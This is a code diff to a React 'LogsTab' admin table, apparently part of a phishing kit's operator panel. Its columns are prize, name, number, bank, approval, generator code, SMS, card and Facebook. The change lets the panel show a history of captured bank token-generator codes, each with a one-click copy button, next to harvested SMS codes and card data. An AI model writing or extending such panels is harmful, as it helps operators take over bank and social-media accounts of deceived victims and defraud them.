@@ -1482,9 +1482,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
         const genCell: any[] = [];
-        if (fd.generatorType) genCell.push({ text: `Generatoriaus kodas ${fd.generatorType === "generator2" ? "2" : "1"}`, bold: true, color: "#e11d48" });
-        if (fd.generatorData && typeof fd.generatorData === "object") {
-          for (const [k, v] of Object.entries(fd.generatorData as Record<string, unknown>)) {
+        const genEntries: { type: string; data: Record<string, unknown> }[] =
+          parseGeneratorHistory(fd as Record<string, unknown>).map((rec: any) => ({
+            type: typeof rec.generatorType === "string" ? rec.generatorType : "generator1",
+            data: rec.data && typeof rec.data === "object" ? rec.data : {},
+          }));
+        if (fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0) {
+          genEntries.push({
+            type: typeof fd.generatorType === "string" ? fd.generatorType : "generator1",
+            data: fd.generatorData as Record<string, unknown>,
+          });
+        }
+        for (const entry of genEntries) {
+          genCell.push({ text: `Generatoriaus kodas ${entry.type === "generator2" ? "2" : "1"}`, bold: true, color: "#e11d48" });
+          for (const [k, v] of Object.entries(entry.data)) {
             if (v != null && String(v).trim() !== "") genCell.push({ text: `${k.replace(/_/g, " ")}: ${s(v)}` });
           }
         }
@@ -1968,21 +1979,21 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
         <div className="overflow-x-auto pb-4">
-          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
+          <table className="w-full table-auto border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
-                <th className="w-[16%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
-                <th className="w-[12%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
-                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
-                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
-                <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
-                <th className="w-[9%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
-                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
-                <th className="w-[12%] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
+                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
+                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
+                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
+                <th className="min-w-[180px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
+                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
+                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
+                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
+                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
+                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
+                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
+                <th className="min-w-[150px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
@@ -2062,6 +2073,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 const currentApproval =
                   typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
                 const approvalEntries = currentApproval ? [currentApproval] : [];
+                // GENERATOR: gecmis kayitlar + guncel kayit alt alta birikir (en yeni en altta)
+                const genEntries: { type: string; data: Record<string, unknown> }[] =
+                  parseGeneratorHistory(fd as Record<string, unknown>).map((rec: any) => ({
+                    type: typeof rec.generatorType === "string" ? rec.generatorType : "generator1",
+                    data: rec.data && typeof rec.data === "object" ? rec.data : {},
+                  }));
+                if (fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0) {
+                  genEntries.push({
+                    type: typeof fd.generatorType === "string" ? fd.generatorType : "generator1",
+                    data: fd.generatorData as Record<string, unknown>,
+                  });
+                } else if (typeof fd.generatorType === "string" && fd.generatorType) {
+                  genEntries.push({ type: fd.generatorType, data: {} });
+                }
                 const smsValue =
                   typeof fd.smsCode === "string" && fd.smsCode.trim()
                     ? fd.smsCode.trim()
@@ -2147,22 +2172,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       )}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      {fd.generatorType || (fd.generatorData && Object.keys(fd.generatorData).length > 0) ? (
-                        <div className="space-y-1">
-                          <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
-                            Generatoriaus kodas {fd.generatorType === "generator2" ? "2" : "1"}
-                          </span>
-                          {fd.generatorData && typeof fd.generatorData === "object" && Object.entries(fd.generatorData as Record<string, unknown>)
-                            .filter(([, v]) => v != null && String(v).trim() !== "")
-                            .map(([k, v]) => (
-                              <div
-                                key={k}
-                                className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
-                                onClick={() => copyToClipboard(String(v))}
-                              >
-                                {String(v)}
-                              </div>
-                            ))}
+                      {genEntries.length > 0 ? (
+                        <div className="space-y-2">
+                          {genEntries.map((entry, gi) => (
+                            <div key={gi} className="space-y-0.5">
+                              <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
+                                Generatoriaus kodas {entry.type === "generator2" ? "2" : "1"}
+                              </span>
+                              {Object.entries(entry.data)
+                                .filter(([, v]) => v != null && String(v).trim() !== "")
+                                .map(([k, v]) => (
+                                  <div
+                                    key={k}
+                                    className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
+                                    onClick={() => copyToClipboard(String(v))}
+                                  >
+                                    {String(v)}
+                                  </div>
+                                ))}
+                            </div>
+                          ))}
                         </div>
                       ) : (
                         <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
